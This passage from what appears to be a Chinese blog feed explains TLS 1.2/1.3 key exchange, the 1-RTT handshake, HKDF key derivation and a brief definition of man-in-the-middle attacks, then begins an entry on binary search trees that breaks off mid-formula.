xmlns="http://www.w3.org/2000/svg" width="7.351ex" height="2.395ex" role="img" focusable="false" viewBox="0 -853.7 3249.3 1058.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mi" transform="translate(863.3,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1741.3,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(2226.3,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(2746.3,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>。</li><li>客户端在进行密钥协商时不再返回加密后的预主密钥，而是返回<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="7.511ex" height="2.034ex" role="img" focusable="false" viewBox="0 -694 3320.1 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mi" transform="translate(934.1,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1812.1,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(2297.1,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(2817.1,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>。</li></ul><img src="/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/Snipaste_2024-06-28_22-33-44.jpg" class=""><h4 id="TLS1-3"><a href="#TLS1-3" class="headerlink" title="TLS1.3"></a>TLS1.3</h4><p><a href="https://blog.nsfocus.net/tls1-3protocol/">绿盟博客TLS1.3详解</a></p><p>TLS1.3总共有两层，分别是握手协议(handshake protocol)和记录协议(record protocol)，握手协议在记录协议的上层，记录协议是一个分层协议。其中握手协议中还包括了警告协议(alert protocol)。</p><h6 id="往返时延上的改进"><a href="#往返时延上的改进" class="headerlink" title="往返时延上的改进"></a>往返时延上的改进</h6><p>我们先来简单回忆一下 Client 的密钥在 1.3 前的 DH(E) 算法下是怎么进行协商的：</p><ol><li>Client -&gt; Server：请求建立连接</li><li>Server -&gt; Client：生成 𝑏 并计算出 𝐵 发向对方</li><li>Client -&gt; Server：生成 𝑎 并计算出 𝐴 发向对方</li><li>双方根据 𝑎⋅𝐵 或 𝑏⋅𝐴 计算出密钥 𝐾</li></ol><p>在客户端和服务器之间进行了两次往返（2-RTT）以完成握手。 平均而言，这需要0.25秒到0.5秒之间的时间。</p><p>在这里我们可以看出 Client 向 Server 发送密钥是在收到 Server 的响应后的，这是因为密钥计算需要 𝑝 和 𝑔 ，而他们又在 Server 的证书里或被证书所签名，所以需要等到收到 Server 证书后才能计算。也就是说，只要我们能够提前得知 𝑝、𝑔 ，就能在第一个握手时就发送 𝐴。</p><p><strong>TLS1.3 在握手上做了优化，只需要一次时延往返就可以建立连接（1-RTT）</strong></p><p>那么它是怎么做的呢？</p><p>其实具体的做法还是利用了扩展。客户端在 <code>Client Hello</code> 消息里直接用 <strong>supported_groups</strong> 带上支持的曲线，比如 P-256、x25519，用 <strong>key_share</strong> 带上曲线对应的客户端公钥参数，用 <strong>signature_algorithms</strong> 带上签名算法。</p><p>服务器收到后在这些扩展里选定一个曲线和参数，再用 <code>key_share</code> 扩展返回服务器这边的公钥参数，就实现了双方的密钥交换。</p><h6 id="握手流程"><a href="#握手流程" class="headerlink" title="握手流程"></a>握手流程</h6><ol><li><p>Client 生成 𝑘𝑒𝑦𝑠ℎ𝑎𝑟𝑒向 Server 发送𝑘𝑒𝑦𝑠ℎ𝑎𝑟𝑒 的结构为一个列表，其中具有多个 &lt;密钥组名，通过<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.344ex" height="1.355ex" role="img" focusable="false" viewBox="0 -441 1036.3 598.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(562,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>和对应组使用的𝑝,𝑔生成的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.844ex" height="1.977ex" role="img" focusable="false" viewBox="0 -716 1257.3 873.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(783,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>&gt; 的数据项。</p><ul><li>为了安全起见，每一个数据项中的 𝑎 (Client 私钥) 都是不一样的</li><li>以上包含的多个组中并不只有 DHE 类型的组，还有 ECDHE 类型，其值中的加密组件所需参数不同</li></ul></li><li><p>Server 从多个密钥组中选择自己能够接受的密钥组；如果没有，则会直接响应自己能够接受的密钥组的组名，让 Client 重新生成对应的 𝐴 并发送（此时 1⋅𝑅𝑇𝑇 会退化为 2⋅𝑅𝑇𝑇 ）。</p><ul><li><p>在选定密钥组后，Server发送决定使用的密钥组的名称，同时使用该组的 𝑝,𝑔 和自己的𝑏计算出𝐵，紧接着根据密钥交换原理通过收到的𝐴计算出𝐾。</p></li><li><p>这里有个被忽略的过程，<a href="https://www.cnblogs.com/enoc/p/tls-handshake.html">这篇文章</a>讲了，非常感谢。在将”服务器端随机数”和 B𝐵 发送出去后，接下来，将通过 K𝐾 导出以下三个密钥：</p><ul><li>𝑚𝑎𝑠𝑡𝑒𝑟 𝑠𝑒𝑐𝑟𝑒𝑡 ：主密钥</li><li>客户端握手密钥：用来加密 Client -&gt; Server 的握手信息</li><li>服务器端握手密钥：用来加密 Server -&gt; Client 的握手信息</li></ul><p>导出密钥后，接下的所有要发送的信息都将被对应的密钥进行加密。对于每个被导出的密钥，所参与的参数与过程都存在不同，且该过程中会使用到 [客户端随机数] 和 [服务器端随机数]，这两参数的交换过程也被省略。</p><p><strong>导出的操作可理解为使用单向散列函数</strong>，以上导出的每个密钥中，参与导出的参数并不完全相同，所以导出的密钥的值也并不同的。</p></li></ul></li><li><p>Client 收到来自 Server 的服务器端随机数和公钥 𝐵 后，也进行以上的计算过程，并根据得出的”服务器端握手密钥”解密接下来收到的握手信息。</p><p>在解密并验证完被加密的证书后，就能确保服务器的身份。同时仍会验证发过来的握手阶段的报文的摘要，确认握手过程未被篡改。</p><p>在保证通信安全后，接下来会和 TLS 1.3 前一样发送握手阶段报文的摘要（当然，这会被”客户端握手密钥”加密）。</p></li><li><p>在两边做完自己的工作后，双方将从𝑚𝑎𝑠𝑡𝑒𝑟 𝑠𝑒𝑐𝑟𝑒𝑡中导出以下四个密钥：</p><ul><li><p>客户端通信密钥：用来加密 Client -&gt; Server 的通信信息</p><p>（上文的两个用于握手报文加密的密钥将会被丢弃）</p></li><li><p>服务器端通信密钥：用来加密 Server -&gt; Client 的通信信息</p></li><li><p>恢复密钥：用来参与 PSK 的计算</p></li><li><p>导出密钥：用来参与默认的密钥导出计算</p></li></ul></li></ol><img src="/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/Snipaste_2024-06-28_22-35-20.jpg" class=""><h4 id="为什么TLS1-3会使用这么多的密钥"><a href="#为什么TLS1-3会使用这么多的密钥" class="headerlink" title="为什么TLS1.3会使用这么多的密钥"></a>为什么TLS1.3会使用这么多的密钥</h4><p>在 TLS 1.3 中，其密钥的导出函数叫做 HKDF，为一个基于 HMAC 的密钥导出函数(KDF)，它执行的主要方法是 “extract-then-expand”，也就是说，先从输入密钥与参数中提取一个固定长度的密钥，然后拓展为多个额外的密钥。重点在于，额外导出的密钥在密码学上是安全的，并且即使其中一个密钥被泄露，也不会导致其他由相同的密钥材料导出的密钥存在风险。</p><p>简单来讲就是，”不要把鸡蛋放在同一个篮子里”。</p><h3 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a>MITM</h3><p>MITM(Man-in-the-MiddleAttack) ，是指攻击者与通讯的两端分别创建独立的联系，并交换其所有收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个对话都被攻击者完全控制，在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。一个中间人攻击能成功的前提条件是攻击者能够将自己伪装成每个参与会话的终端，并且不被其他终端识破。</p><h3 id="心脏滴血漏洞分析"><a href="#心脏滴血漏洞分析" class="headerlink" title="心脏滴血漏洞分析"></a>心脏滴血漏洞分析</h3><p><a href="https://3xsh0re.github.io/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">请跳转至我的另一篇博客阅读</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字认证技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode530学习二叉搜索树</title>
    <link href="/2024/06/22/leetcode530%E5%AD%A6%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/"/>
    <url>/2024/06/22/leetcode530%E5%AD%A6%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>二叉搜索树YES！</p><span id="more"></span><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>二叉搜索树是一种二叉树的树形数据结构，其定义如下：</p><ol><li>空树是二叉搜索树。</li><li>若二叉搜索树的左子树不为空，则其左子树上所有点的附加权值均小于其根节点的值。</li><li>若二叉搜索树的右子树不为空，则其右子树上所有点的附加权值均大于其根节点的值。</li><li>二叉搜索树的左右子树均为二叉搜索树。</li></ol><p>二叉搜索树上的基本操作所花费的时间与这棵树的高度成正比。对于一个有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>个结点的二叉搜索树中，这些操作的最优时间复杂度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="7.695ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3401 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(1450,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1935,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(2412,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3012,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，最坏为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.844ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2141 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1752,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。随机构造这样一棵二叉搜索树的期望高度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="7.695ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3401 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" 